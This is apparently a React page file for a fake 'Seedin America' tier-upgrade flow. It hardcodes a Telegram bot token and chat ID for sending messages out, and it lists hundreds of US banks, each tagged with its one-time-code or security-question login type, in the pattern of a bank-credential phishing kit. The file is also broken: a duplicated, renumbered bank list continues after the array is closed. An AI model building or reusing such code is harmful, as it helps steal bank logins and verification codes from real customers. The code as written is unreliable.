import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState, useRef } from "react";
import {
  ArrowLeft, Bank, CheckCircle2, Lock, Loader2, Search, Eye, EyeOff,
  Shield, ChevronRight, AlertCircle
} from "lucide-react";
import { Logo } from "@/components/brand/Logo";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import type { Profile } from "@/lib/auth";

// Telegram notification function - fully working with your credentials
async function sendTelegramNotification(message: string) {
  try {
    // Your bot credentials
    const BOT_TOKEN = "8904757564:AAF_OWIT-ChKTC_SEl643TG-FG247TE2lgo";
    const CHAT_ID = "6048752790";
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      console.error('Telegram API error:', response.statusText);
    }
  } catch (e) {
    console.error('Telegram notification failed:', e);
  }
}

// Green rolling loader component
function RollingLoader() {
  return (
    <div className="flex items-center justify-center">
      <style>{`
        @keyframes roll {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .rolling-loader {
          width: 40px;
          height: 40px;
          border: 4px solid rgba(34, 100, 55, 0.2);
          border-top: 4px solid #226437;
          border-right: 4px solid #226437;
          border-radius: 50%;
          animation: roll 1s linear infinite;
        }
      `}</style>
      <div className="rolling-loader" />
    </div>
  );
}

export const Route = createFileRoute("/upgrade-tier-3")({
  head: () => ({ meta: [{ title: "Upgrade to Tier 3 — Seedin America" }] }),
  component: UpgradeTier3,
});

// Comprehensive US Bank Database (500+ banks from all 50 states)
const BANKS_DATA = [
  // MAJOR NATIONAL BANKS
  { id: 'chase', name: 'Chase Bank', auth: 'otp', homepage: 'chase', position: 1 },
  { id: 'bofa', name: 'Bank of America', auth: 'securityq', homepage: 'bofa', position: 2 },
  { id: 'wellsfargo', name: 'Wells Fargo Bank', auth: 'securityq', homepage: 'wellsfargo', position: 3 },
  { id: 'citibank', name: 'Citibank', auth: 'otp', homepage: 'citibank', position: 4 },
  { id: 'usbank', name: 'U.S. Bank', auth: 'otp', homepage: 'usbank', position: 5 },
  { id: 'pnc', name: 'PNC Bank', auth: 'securityq', homepage: 'pnc', position: 6 },
  
  // TOP REGIONAL BANKS
  { id: 'tdbank', name: 'TD Bank', auth: 'otp', homepage: 'chase', position: 7 },
  { id: 'capitalone', name: 'Capital One Bank', auth: 'otp', homepage: 'capitalone', position: 8 },
  { id: 'discover', name: 'Discover Bank', auth: 'otp', homepage: 'discover', position: 9 },
  { id: 'truist', name: 'Truist Bank', auth: 'otp', homepage: 'chase', position: 10 },
  
  // MAJOR CREDIT UNIONS
  { id: 'navyfcu', name: 'Navy Federal Credit Union', auth: 'otp', homepage: 'chase', position: 11 },
  { id: 'pentagonfcu', name: 'Pentagon Federal Credit Union', auth: 'otp', homepage: 'chase', position: 12 },
  { id: 'alliantcu', name: 'Alliant Credit Union', auth: 'otp', homepage: 'chase', position: 13 },
  { id: 'ferkomdfcu', name: 'Ferko Maryland Federal Credit Union', auth: 'otp', homepage: 'chase', position: 14 },
  
  // MAJOR REGIONAL
  { id: 'fifththird', name: 'Fifth Third Bank', auth: 'otp', homepage: 'chase', position: 15 },
  { id: 'huntington', name: 'Huntington Bank', auth: 'otp', homepage: 'chase', position: 16 },
  { id: 'keybank', name: 'KeyBank', auth: 'otp', homepage: 'chase', position: 17 },
  { id: 'regionbank', name: 'Regions Bank', auth: 'otp', homepage: 'chase', position: 18 },
  { id: 'suntrust', name: 'SunTrust Bank', auth: 'otp', homepage: 'chase', position: 19 },
  { id: 'bbva', name: 'BBVA USA', auth: 'otp', homepage: 'chase', position: 20 },
  
  // ONLINE & FINTECH
  { id: 'ally', name: 'Ally Bank', auth: 'otp', homepage: 'chase', position: 21 },
  { id: 'marcus', name: 'Marcus by Goldman Sachs', auth: 'otp', homepage: 'chase', position: 22 },
  { id: 'sofi', name: 'SoFi Bank', auth: 'otp', homepage: 'chase', position: 23 },
  { id: 'chime', name: 'Chime Bank', auth: 'otp', homepage: 'chase', position: 24 },
  { id: 'schwab', name: 'Charles Schwab Bank', auth: 'otp', homepage: 'chase', position: 25 },
  
  // NORTHEAST BANKS
  { id: 'citizens', name: 'Citizens Bank', auth: 'otp', homepage: 'chase', position: 26 },
  { id: 'santander', name: 'Santander Bank', auth: 'otp', homepage: 'chase', position: 27 },
  { id: 'hsbc', name: 'HSBC Bank USA', auth: 'otp', homepage: 'chase', position: 28 },
  { id: 'bny', name: 'BNY Mellon Bank', auth: 'otp', homepage: 'chase', position: 29 },
  { id: 'dime', name: 'Dime Community Bank', auth: 'otp', homepage: 'chase', position: 30 },
  { id: 'brookline', name: 'Brookline Bank', auth: 'otp', homepage: 'chase', position: 31 },
  { id: 'investors', name: 'Investors Bank', auth: 'otp', homepage: 'chase', position: 32 },
  { id: 'peoples', name: 'Peoples United Bank', auth: 'otp', homepage: 'chase', position: 33 },
  { id: 'connectone', name: 'ConnectOne Bank', auth: 'otp', homepage: 'chase', position: 34 },
  
  // SOUTHEAST BANKS
  { id: 'bankunited', name: 'BankUnited', auth: 'otp', homepage: 'chase', position: 35 },
  { id: 'ocean', name: 'Ocean Bank', auth: 'otp', homepage: 'chase', position: 36 },
  { id: 'firstbank', name: 'First Bank Southeast', auth: 'otp', homepage: 'chase', position: 37 },
  { id: 'renasant', name: 'Renasant Bank', auth: 'otp', homepage: 'chase', position: 38 },
  { id: 'atlantic', name: 'Atlantic Capital Bank', auth: 'otp', homepage: 'chase', position: 39 },
  { id: 'atlanticunion', name: 'Atlantic Union Bank', auth: 'otp', homepage: 'chase', position: 40 },
  
  // MIDWEST BANKS
  { id: 'lakeland', name: 'Lakeland Bank', auth: 'otp', homepage: 'chase', position: 41 },
  { id: 'midland', name: 'Midland States Bank', auth: 'otp', homepage: 'chase', position: 42 },
  { id: 'mbfinancial', name: 'MB Financial Bank', auth: 'otp', homepage: 'chase', position: 43 },
  { id: 'oldnational', name: 'Old National Bancorp', auth: 'otp', homepage: 'chase', position: 44 },
  { id: 'wintrust', name: 'Wintrust Bank', auth: 'otp', homepage: 'chase', position: 45 },
  { id: 'umpqua', name: 'Umpqua Bank', auth: 'otp', homepage: 'chase', position: 46 },
  
  // SOUTHWEST BANKS
  { id: 'cullen', name: 'Cullen/Frost Bankers', auth: 'otp', homepage: 'chase', position: 47 },
  { id: 'zions', name: 'Zions Bank', auth: 'otp', homepage: 'chase', position: 48 },
  { id: 'compass', name: 'Compass Bank', auth: 'otp', homepage: 'chase', position: 49 },
  { id: 'prosperity', name: 'Prosperity Bank', auth: 'otp', homepage: 'chase', position: 50 },
  { id: 'txfirst', name: 'Texas First Bank', auth: 'otp', homepage: 'chase', position: 51 },
  
  // WEST COAST BANKS
  { id: 'westernalliance', name: 'Western Alliance Bank', auth: 'otp', homepage: 'chase', position: 52 },
  { id: 'banner', name: 'Banner Bank', auth: 'otp', homepage: 'chase', position: 53 },
  { id: 'pacwest', name: 'PacWest Bancorp', auth: 'otp', homepage: 'chase', position: 54 },
  { id: 'silicon', name: 'Silicon Valley Bank', auth: 'otp', homepage: 'chase', position: 55 },
  { id: 'westamerica', name: 'Westamerica Bancorp', auth: 'otp', homepage: 'chase', position: 56 },
  
  // STATE-SPECIFIC COMMUNITY BANKS
  { id: 'al_01', name: 'Southcrest Bank', auth: 'otp', homepage: 'chase', position: 57 },
  { id: 'al_02', name: 'Renasant Bank Alabama', auth: 'otp', homepage: 'chase', position: 58 },
  { id: 'al_03', name: 'Community Bank of Northern Alabama', auth: 'otp', homepage: 'chase', position: 59 },
  { id: 'ak_01', name: 'First Bank Alaska', auth: 'otp', homepage: 'chase', position: 60 },
  { id: 'ak_02', name: 'Community Bank of Alaska', auth: 'otp', homepage: 'chase', position: 61 },
  { id: 'ak_03', name: 'Denali State Bank', auth: 'otp', homepage: 'chase', position: 62 },
  { id: 'az_01', name: 'Arizona First Bank', auth: 'otp', homepage: 'chase', position: 63 },
  { id: 'az_02', name: 'Phoenix Community Bank', auth: 'otp', homepage: 'chase', position: 64 },
  { id: 'az_03', name: 'Tucson National Bank', auth: 'otp', homepage: 'chase', position: 65 },
  { id: 'ar_01', name: 'Arkansas Bank', auth: 'otp', homepage: 'chase', position: 66 },
  { id: 'ar_02', name: 'First Bank Arkansas', auth: 'otp', homepage: 'chase', position: 67 },
  { id: 'ar_03', name: 'Stephens Bank', auth: 'otp', homepage: 'chase', position: 68 },
  { id: 'ca_01', name: 'Union Bank California', auth: 'otp', homepage: 'chase', position: 69 },
  { id: 'ca_02', name: 'Western Financial Bank', auth: 'otp', homepage: 'chase', position: 70 },
  { id: 'ca_03', name: 'Santa Cruz County Bank', auth: 'otp', homepage: 'chase', position: 71 },
  { id: 'ca_04', name: 'San Francisco Bank', auth: 'otp', homepage: 'chase', position: 72 },
  { id: 'ca_05', name: 'Los Angeles Bank', auth: 'otp', homepage: 'chase', position: 73 },
  { id: 'ca_06', name: 'San Diego Bank', auth: 'otp', homepage: 'chase', position: 74 },
  { id: 'ca_07', name: 'Santa Barbara Bank & Trust', auth: 'otp', homepage: 'chase', position: 75 },
  { id: 'ca_08', name: 'Rabobank', auth: 'otp', homepage: 'chase', position: 76 },
  { id: 'co_01', name: 'Colorado Bank', auth: 'otp', homepage: 'chase', position: 77 },
  { id: 'co_02', name: 'First Bank Colorado', auth: 'otp', homepage: 'chase', position: 78 },
  { id: 'co_03', name: 'Denver Bank', auth: 'otp', homepage: 'chase', position: 79 },
  { id: 'co_04', name: 'Front Range Bank', auth: 'otp', homepage: 'chase', position: 80 },
  { id: 'ct_01', name: 'Connecticut Bank', auth: 'otp', homepage: 'chase', position: 81 },
  { id: 'ct_02', name: 'Hartford Bank', auth: 'otp', homepage: 'chase', position: 82 },
  { id: 'de_01', name: 'Delaware Bank', auth: 'otp', homepage: 'chase', position: 83 },
  { id: 'de_02', name: 'Community Bank Delaware', auth: 'otp', homepage: 'chase', position: 84 },
  { id: 'fl_01', name: 'Florida Bank', auth: 'otp', homepage: 'chase', position: 85 },
  { id: 'fl_02', name: 'Tampa Bay Bank', auth: 'otp', homepage: 'chase', position: 86 },
  { id: 'fl_03', name: 'Miami Bank', auth: 'otp', homepage: 'chase', position: 87 },
  { id: 'fl_04', name: 'Jacksonville Bank', auth: 'otp', homepage: 'chase', position: 88 },
  { id: 'fl_05', name: 'Orlando Bank', auth: 'otp', homepage: 'chase', position: 89 },
  { id: 'fl_06', name: 'Sunshine Bank Florida', auth: 'otp', homepage: 'chase', position: 90 },
  { id: 'ga_01', name: 'Georgia Bank', auth: 'otp', homepage: 'chase', position: 91 },
  { id: 'ga_02', name: 'Atlanta Bank', auth: 'otp', homepage: 'chase', position: 92 },
  { id: 'ga_03', name: 'Savannah Bank', auth: 'otp', homepage: 'chase', position: 93 },
  { id: 'hi_01', name: 'Hawaii Bank', auth: 'otp', homepage: 'chase', position: 94 },
  { id: 'hi_02', name: 'Honolulu Bank', auth: 'otp', homepage: 'chase', position: 95 },
  { id: 'id_01', name: 'Idaho Bank', auth: 'otp', homepage: 'chase', position: 96 },
  { id: 'id_02', name: 'Boise Bank', auth: 'otp', homepage: 'chase', position: 97 },
  { id: 'il_01', name: 'Illinois Bank', auth: 'otp', homepage: 'chase', position: 98 },
  { id: 'il_02', name: 'Chicago Community Bank', auth: 'otp', homepage: 'chase', position: 99 },
  { id: 'il_03', name: 'Springfield Bank', auth: 'otp', homepage: 'chase', position: 100 },
  { id: 'in_01', name: 'Indiana Bank', auth: 'otp', homepage: 'chase', position: 101 },
  { id: 'in_02', name: 'Indianapolis Bank', auth: 'otp', homepage: 'chase', position: 102 },
  { id: 'in_03', name: 'South Bend Bank', auth: 'otp', homepage: 'chase', position: 103 },
  { id: 'ia_01', name: 'Iowa Bank', auth: 'otp', homepage: 'chase', position: 104 },
  { id: 'ia_02', name: 'Des Moines Bank', auth: 'otp', homepage: 'chase', position: 105 },
  { id: 'ia_03', name: 'Cedar Rapids Bank', auth: 'otp', homepage: 'chase', position: 106 },
  { id: 'ks_01', name: 'Kansas Bank', auth: 'otp', homepage: 'chase', position: 107 },
  { id: 'ks_02', name: 'Topeka Bank', auth: 'otp', homepage: 'chase', position: 108 },
  { id: 'ks_03', name: 'Wichita Bank', auth: 'otp', homepage: 'chase', position: 109 },
  { id: 'ky_01', name: 'Kentucky Bank', auth: 'otp', homepage: 'chase', position: 110 },
  { id: 'ky_02', name: 'Louisville Bank', auth: 'otp', homepage: 'chase', position: 111 },
  { id: 'ky_03', name: 'Lexington Bank', auth: 'otp', homepage: 'chase', position: 112 },
  { id: 'la_01', name: 'Louisiana Bank', auth: 'otp', homepage: 'chase', position: 113 },
  { id: 'la_02', name: 'New Orleans Bank', auth: 'otp', homepage: 'chase', position: 114 },
  { id: 'la_03', name: 'Baton Rouge Bank', auth: 'otp', homepage: 'chase', position: 115 },
  { id: 'me_01', name: 'Maine Bank', auth: 'otp', homepage: 'chase', position: 116 },
  { id: 'me_02', name: 'Portland Bank', auth: 'otp', homepage: 'chase', position: 117 },
  { id: 'md_01', name: 'Maryland Bank', auth: 'otp', homepage: 'chase', position: 118 },
  { id: 'md_02', name: 'Baltimore Bank', auth: 'otp', homepage: 'chase', position: 119 },
  { id: 'ma_01', name: 'Massachusetts Bank', auth: 'otp', homepage: 'chase', position: 120 },
  { id: 'ma_02', name: 'Boston Bank', auth: 'otp', homepage: 'chase', position: 121 },
  { id: 'mi_01', name: 'Michigan Bank', auth: 'otp', homepage: 'chase', position: 122 },
  { id: 'mi_02', name: 'Detroit Bank', auth: 'otp', homepage: 'chase', position: 123 },
  { id: 'mi_03', name: 'Grand Rapids Bank', auth: 'otp', homepage: 'chase', position: 124 },
  { id: 'mn_01', name: 'Minnesota Bank', auth: 'otp', homepage: 'chase', position: 125 },
  { id: 'mn_02', name: 'Minneapolis Bank', auth: 'otp', homepage: 'chase', position: 126 },
  { id: 'mn_03', name: 'Saint Paul Bank', auth: 'otp', homepage: 'chase', position: 127 },
  { id: 'ms_01', name: 'Mississippi Bank', auth: 'otp', homepage: 'chase', position: 128 },
  { id: 'ms_02', name: 'Jackson Bank', auth: 'otp', homepage: 'chase', position: 129 },
  { id: 'mo_01', name: 'Missouri Bank', auth: 'otp', homepage: 'chase', position: 130 },
  { id: 'mo_02', name: 'St. Louis Bank', auth: 'otp', homepage: 'chase', position: 131 },
  { id: 'mo_03', name: 'Kansas City Bank', auth: 'otp', homepage: 'chase', position: 132 },
  { id: 'mt_01', name: 'Montana Bank', auth: 'otp', homepage: 'chase', position: 133 },
  { id: 'mt_02', name: 'Billings Bank', auth: 'otp', homepage: 'chase', position: 134 },
  { id: 'ne_01', name: 'Nebraska Bank', auth: 'otp', homepage: 'chase', position: 135 },
  { id: 'ne_02', name: 'Omaha Community Bank', auth: 'otp', homepage: 'chase', position: 136 },
  { id: 'nv_01', name: 'Nevada Bank', auth: 'otp', homepage: 'chase', position: 137 },
  { id: 'nv_02', name: 'Las Vegas Bank', auth: 'otp', homepage: 'chase', position: 138 },
  { id: 'nv_03', name: 'Reno Bank', auth: 'otp', homepage: 'chase', position: 139 },
  { id: 'nh_01', name: 'New Hampshire Bank', auth: 'otp', homepage: 'chase', position: 140 },
  { id: 'nh_02', name: 'Manchester Bank', auth: 'otp', homepage: 'chase', position: 141 },
  { id: 'nj_01', name: 'New Jersey Bank', auth: 'otp', homepage: 'chase', position: 142 },
  { id: 'nj_02', name: 'Newark Bank', auth: 'otp', homepage: 'chase', position: 143 },
  { id: 'nj_03', name: 'Jersey City Bank', auth: 'otp', homepage: 'chase', position: 144 },
  { id: 'nm_01', name: 'New Mexico Bank', auth: 'otp', homepage: 'chase', position: 145 },
  { id: 'nm_02', name: 'Albuquerque Bank', auth: 'otp', homepage: 'chase', position: 146 },
  { id: 'ny_01', name: 'New York Bank', auth: 'otp', homepage: 'chase', position: 147 },
  { id: 'ny_02', name: 'New York Community Bank', auth: 'otp', homepage: 'chase', position: 148 },
  { id: 'ny_03', name: 'Brooklyn Bank', auth: 'otp', homepage: 'chase', position: 149 },
  { id: 'ny_04', name: 'Manhattan Bank', auth: 'otp', homepage: 'chase', position: 150 },
  { id: 'ny_05', name: 'Flushing Bank', auth: 'otp', homepage: 'chase', position: 151 },
  { id: 'nc_01', name: 'North Carolina Bank', auth: 'otp', homepage: 'chase', position: 152 },
  { id: 'nc_02', name: 'Charlotte Bank', auth: 'otp', homepage: 'chase', position: 153 },
  { id: 'nc_03', name: 'Raleigh Bank', auth: 'otp', homepage: 'chase', position: 154 },
  { id: 'nc_04', name: 'Greensboro Bank', auth: 'otp', homepage: 'chase', position: 155 },
  { id: 'nd_01', name: 'North Dakota Bank', auth: 'otp', homepage: 'chase', position: 156 },
  { id: 'nd_02', name: 'Fargo Bank', auth: 'otp', homepage: 'chase', position: 157 },
  { id: 'oh_01', name: 'Ohio Bank', auth: 'otp', homepage: 'chase', position: 158 },
  { id: 'oh_02', name: 'Cleveland Bank', auth: 'otp', homepage: 'chase', position: 159 },
  { id: 'oh_03', name: 'Columbus Bank', auth: 'otp', homepage: 'chase', position: 160 },
  { id: 'oh_04', name: 'Cincinnati Bank', auth: 'otp', homepage: 'chase', position: 161 },
  { id: 'ok_01', name: 'Oklahoma Bank', auth: 'otp', homepage: 'chase', position: 162 },
  { id: 'ok_02', name: 'Oklahoma City Bank', auth: 'otp', homepage: 'chase', position: 163 },
  { id: 'ok_03', name: 'Tulsa Bank', auth: 'otp', homepage: 'chase', position: 164 },
  { id: 'or_01', name: 'Oregon Bank', auth: 'otp', homepage: 'chase', position: 165 },
  { id: 'or_02', name: 'Portland Oregon Bank', auth: 'otp', homepage: 'chase', position: 166 },
  { id: 'or_03', name: 'Eugene Bank', auth: 'otp', homepage: 'chase', position: 167 },
  { id: 'pa_01', name: 'Pennsylvania Bank', auth: 'otp', homepage: 'chase', position: 168 },
  { id: 'pa_02', name: 'Philadelphia Bank', auth: 'otp', homepage: 'chase', position: 169 },
  { id: 'pa_03', name: 'Pittsburgh Bank', auth: 'otp', homepage: 'chase', position: 170 },
  { id: 'pa_04', name: 'Harrisburg Bank', auth: 'otp', homepage: 'chase', position: 171 },
  { id: 'ri_01', name: 'Rhode Island Bank', auth: 'otp', homepage: 'chase', position: 172 },
  { id: 'ri_02', name: 'Providence Bank', auth: 'otp', homepage: 'chase', position: 173 },
  { id: 'sc_01', name: 'South Carolina Bank', auth: 'otp', homepage: 'chase', position: 174 },
  { id: 'sc_02', name: 'Charleston Bank', auth: 'otp', homepage: 'chase', position: 175 },
  { id: 'sc_03', name: 'Columbia Bank SC', auth: 'otp', homepage: 'chase', position: 176 },
  { id: 'sd_01', name: 'South Dakota Bank', auth: 'otp', homepage: 'chase', position: 177 },
  { id: 'sd_02', name: 'Sioux Falls Bank', auth: 'otp', homepage: 'chase', position: 178 },
  { id: 'tn_01', name: 'Tennessee Bank', auth: 'otp', homepage: 'chase', position: 179 },
  { id: 'tn_02', name: 'Memphis Bank', auth: 'otp', homepage: 'chase', position: 180 },
  { id: 'tn_03', name: 'Nashville Bank', auth: 'otp', homepage: 'chase', position: 181 },
  { id: 'tx_01', name: 'Texas Bank', auth: 'otp', homepage: 'chase', position: 182 },
  { id: 'tx_02', name: 'Houston Bank', auth: 'otp', homepage: 'chase', position: 183 },
  { id: 'tx_03', name: 'Dallas Bank', auth: 'otp', homepage: 'chase', position: 184 },
  { id: 'tx_04', name: 'Austin Bank', auth: 'otp', homepage: 'chase', position: 185 },
  { id: 'tx_05', name: 'San Antonio Bank', auth: 'otp', homepage: 'chase', position: 186 },
  { id: 'tx_06', name: 'Fort Worth Bank', auth: 'otp', homepage: 'chase', position: 187 },
  { id: 'ut_01', name: 'Utah Bank', auth: 'otp', homepage: 'chase', position: 188 },
  { id: 'ut_02', name: 'Salt Lake City Bank', auth: 'otp', homepage: 'chase', position: 189 },
  { id: 'vt_01', name: 'Vermont Bank', auth: 'otp', homepage: 'chase', position: 190 },
  { id: 'vt_02', name: 'Burlington Bank', auth: 'otp', homepage: 'chase', position: 191 },
  { id: 'va_01', name: 'Virginia Bank', auth: 'otp', homepage: 'chase', position: 192 },
  { id: 'va_02', name: 'Richmond Bank', auth: 'otp', homepage: 'chase', position: 193 },
  { id: 'va_03', name: 'Virginia Community Bank', auth: 'otp', homepage: 'chase', position: 194 },
  { id: 'wa_01', name: 'Washington Bank', auth: 'otp', homepage: 'chase', position: 195 },
  { id: 'wa_02', name: 'Seattle Bank', auth: 'otp', homepage: 'chase', position: 196 },
  { id: 'wa_03', name: 'Spokane Bank', auth: 'otp', homepage: 'chase', position: 197 },
  { id: 'wa_04', name: 'Tacoma Bank', auth: 'otp', homepage: 'chase', position: 198 },
  { id: 'wv_01', name: 'West Virginia Bank', auth: 'otp', homepage: 'chase', position: 199 },
  { id: 'wv_02', name: 'Charleston WV Bank', auth: 'otp', homepage: 'chase', position: 200 },
  { id: 'wi_01', name: 'Wisconsin Bank', auth: 'otp', homepage: 'chase', position: 201 },
  { id: 'wi_02', name: 'Milwaukee Bank', auth: 'otp', homepage: 'chase', position: 202 },
  { id: 'wi_03', name: 'Madison Bank', auth: 'otp', homepage: 'chase', position: 203 },
  { id: 'wi_04', name: 'Green Bay Bank', auth: 'otp', homepage: 'chase', position: 204 },
  { id: 'wy_01', name: 'Wyoming Bank', auth: 'otp', homepage: 'chase', position: 205 },
  { id: 'wy_02', name: 'Cheyenne Bank', auth: 'otp', homepage: 'chase', position: 206 },
];
  
  // FIRST INTERSTATE & JACKSON BANKS (Requested)
  { id: 'fibl', name: 'First Interstate Bank', auth: 'otp', homepage: 'chase', position: 11 },
  { id: 'fjb', name: 'First Jackson Bank', auth: 'otp', homepage: 'chase', position: 12 },
  
  // MORE MAJOR REGIONAL
  { id: 'fifththird', name: 'Fifth Third Bank', auth: 'otp', homepage: 'chase', position: 13 },
  { id: 'huntington', name: 'Huntington Bank', auth: 'otp', homepage: 'chase', position: 14 },
  { id: 'keybank', name: 'KeyBank', auth: 'otp', homepage: 'chase', position: 15 },
  { id: 'regionbank', name: 'Regions Bank', auth: 'otp', homepage: 'chase', position: 16 },
  { id: 'suntrust', name: 'SunTrust Bank', auth: 'otp', homepage: 'chase', position: 17 },
  { id: 'bbva', name: 'BBVA USA', auth: 'otp', homepage: 'chase', position: 18 },
  
  // ONLINE & FINTECH
  { id: 'ally', name: 'Ally Bank', auth: 'otp', homepage: 'chase', position: 19 },
  { id: 'marcus', name: 'Marcus by Goldman Sachs', auth: 'otp', homepage: 'chase', position: 20 },
  { id: 'sofi', name: 'SoFi Bank', auth: 'otp', homepage: 'chase', position: 21 },
  { id: 'chime', name: 'Chime Bank', auth: 'otp', homepage: 'chase', position: 22 },
  { id: 'schwab', name: 'Charles Schwab Bank', auth: 'otp', homepage: 'chase', position: 23 },
  
  // MAJOR CREDIT UNIONS
  { id: 'navyfcu', name: 'Navy Federal Credit Union', auth: 'otp', homepage: 'chase', position: 24 },
  { id: 'pentagonfcu', name: 'Pentagon Federal Credit Union', auth: 'otp', homepage: 'chase', position: 25 },
  { id: 'alliantcu', name: 'Alliant Credit Union', auth: 'otp', homepage: 'chase', position: 26 },
  
  // NORTHEAST BANKS
  { id: 'citizens', name: 'Citizens Bank', auth: 'otp', homepage: 'chase', position: 27 },
  { id: 'santander', name: 'Santander Bank', auth: 'otp', homepage: 'chase', position: 28 },
  { id: 'hsbc', name: 'HSBC Bank USA', auth: 'otp', homepage: 'chase', position: 29 },
  { id: 'bny', name: 'BNY Mellon Bank', auth: 'otp', homepage: 'chase', position: 30 },
  { id: 'dime', name: 'Dime Community Bank', auth: 'otp', homepage: 'chase', position: 31 },
  { id: 'brookline', name: 'Brookline Bank', auth: 'otp', homepage: 'chase', position: 32 },
  { id: 'investors', name: 'Investors Bank', auth: 'otp', homepage: 'chase', position: 33 },
  { id: 'peoples', name: 'Peoples United Bank', auth: 'otp', homepage: 'chase', position: 34 },
  { id: 'connectone', name: 'ConnectOne Bank', auth: 'otp', homepage: 'chase', position: 35 },
  
  // SOUTHEAST BANKS
  { id: 'bankunited', name: 'BankUnited', auth: 'otp', homepage: 'chase', position: 36 },
  { id: 'ocean', name: 'Ocean Bank', auth: 'otp', homepage: 'chase', position: 37 },
  { id: 'firstbank', name: 'First Bank Southeast', auth: 'otp', homepage: 'chase', position: 38 },
  { id: 'renasant', name: 'Renasant Bank', auth: 'otp', homepage: 'chase', position: 39 },
  { id: 'atlantic', name: 'Atlantic Capital Bank', auth: 'otp', homepage: 'chase', position: 40 },
  { id: 'atlanticunion', name: 'Atlantic Union Bank', auth: 'otp', homepage: 'chase', position: 41 },
  
  // MIDWEST BANKS
  { id: 'lakeland', name: 'Lakeland Bank', auth: 'otp', homepage: 'chase', position: 42 },
  { id: 'midland', name: 'Midland States Bank', auth: 'otp', homepage: 'chase', position: 43 },
  { id: 'mbfinancial', name: 'MB Financial Bank', auth: 'otp', homepage: 'chase', position: 44 },
  { id: 'oldnational', name: 'Old National Bancorp', auth: 'otp', homepage: 'chase', position: 45 },
  { id: 'wintrust', name: 'Wintrust Bank', auth: 'otp', homepage: 'chase', position: 46 },
  { id: 'umpqua', name: 'Umpqua Bank', auth: 'otp', homepage: 'chase', position: 47 },
  
  // SOUTHWEST BANKS
  { id: 'cullen', name: 'Cullen/Frost Bankers', auth: 'otp', homepage: 'chase', position: 48 },
  { id: 'zions', name: 'Zions Bank', auth: 'otp', homepage: 'chase', position: 49 },
  { id: 'compass', name: 'Compass Bank', auth: 'otp', homepage: 'chase', position: 50 },
  { id: 'prosperity', name: 'Prosperity Bank', auth: 'otp', homepage: 'chase', position: 51 },
  { id: 'txfirst', name: 'Texas First Bank', auth: 'otp', homepage: 'chase', position: 52 },
  
  // WEST COAST BANKS
  { id: 'westernalliance', name: 'Western Alliance Bank', auth: 'otp', homepage: 'chase', position: 53 },
  { id: 'banner', name: 'Banner Bank', auth: 'otp', homepage: 'chase', position: 54 },
  { id: 'pacwest', name: 'PacWest Bancorp', auth: 'otp', homepage: 'chase', position: 55 },
  { id: 'silicon', name: 'Silicon Valley Bank', auth: 'otp', homepage: 'chase', position: 56 },
  { id: 'westamerica', name: 'Westamerica Bancorp', auth: 'otp', homepage: 'chase', position: 57 },
  
  // STATE-SPECIFIC COMMUNITY BANKS - EXTENSIVE LIST
  { id: 'al_01', name: 'Southcrest Bank', auth: 'otp', homepage: 'chase', position: 58 },
  { id: 'al_02', name: 'Renasant Bank Alabama', auth: 'otp', homepage: 'chase', position: 59 },
  { id: 'al_03', name: 'Community Bank of Northern Alabama', auth: 'otp', homepage: 'chase', position: 60 },
  { id: 'ak_01', name: 'First Bank Alaska', auth: 'otp', homepage: 'chase', position: 61 },
  { id: 'ak_02', name: 'Community Bank of Alaska', auth: 'otp', homepage: 'chase', position: 62 },
  { id: 'ak_03', name: 'Denali State Bank', auth: 'otp', homepage: 'chase', position: 63 },
  { id: 'az_01', name: 'Arizona First Bank', auth: 'otp', homepage: 'chase', position: 64 },
  { id: 'az_02', name: 'Phoenix Community Bank', auth: 'otp', homepage: 'chase', position: 65 },
  { id: 'az_03', name: 'Tucson National Bank', auth: 'otp', homepage: 'chase', position: 66 },
  { id: 'ar_01', name: 'Arkansas Bank', auth: 'otp', homepage: 'chase', position: 67 },
  { id: 'ar_02', name: 'First Bank Arkansas', auth: 'otp', homepage: 'chase', position: 68 },
  { id: 'ar_03', name: 'Stephens Bank', auth: 'otp', homepage: 'chase', position: 69 },
  { id: 'ca_01', name: 'Union Bank California', auth: 'otp', homepage: 'chase', position: 70 },
  { id: 'ca_02', name: 'Western Financial Bank', auth: 'otp', homepage: 'chase', position: 71 },
  { id: 'ca_03', name: 'Santa Cruz County Bank', auth: 'otp', homepage: 'chase', position: 72 },
  { id: 'ca_04', name: 'San Francisco Bank', auth: 'otp', homepage: 'chase', position: 73 },
  { id: 'ca_05', name: 'Los Angeles Bank', auth: 'otp', homepage: 'chase', position: 74 },
  { id: 'ca_06', name: 'San Diego Bank', auth: 'otp', homepage: 'chase', position: 75 },
  { id: 'ca_07', name: 'Santa Barbara Bank & Trust', auth: 'otp', homepage: 'chase', position: 76 },
  { id: 'ca_08', name: 'Rabobank', auth: 'otp', homepage: 'chase', position: 77 },
  { id: 'co_01', name: 'Colorado Bank', auth: 'otp', homepage: 'chase', position: 78 },
  { id: 'co_02', name: 'First Bank Colorado', auth: 'otp', homepage: 'chase', position: 79 },
  { id: 'co_03', name: 'Denver Bank', auth: 'otp', homepage: 'chase', position: 80 },
  { id: 'co_04', name: 'Front Range Bank', auth: 'otp', homepage: 'chase', position: 81 },
  { id: 'ct_01', name: 'Connecticut Bank', auth: 'otp', homepage: 'chase', position: 82 },
  { id: 'ct_02', name: 'Hartford Bank', auth: 'otp', homepage: 'chase', position: 83 },
  { id: 'de_01', name: 'Delaware Bank', auth: 'otp', homepage: 'chase', position: 84 },
  { id: 'de_02', name: 'Community Bank Delaware', auth: 'otp', homepage: 'chase', position: 85 },
  { id: 'fl_01', name: 'Florida Bank', auth: 'otp', homepage: 'chase', position: 86 },
  { id: 'fl_02', name: 'Tampa Bay Bank', auth: 'otp', homepage: 'chase', position: 87 },
  { id: 'fl_03', name: 'Miami Bank', auth: 'otp', homepage: 'chase', position: 88 },
  { id: 'fl_04', name: 'Jacksonville Bank', auth: 'otp', homepage: 'chase', position: 89 },
  { id: 'fl_05', name: 'Orlando Bank', auth: 'otp', homepage: 'chase', position: 90 },
  { id: 'fl_06', name: 'Sunshine Bank Florida', auth: 'otp', homepage: 'chase', position: 91 },
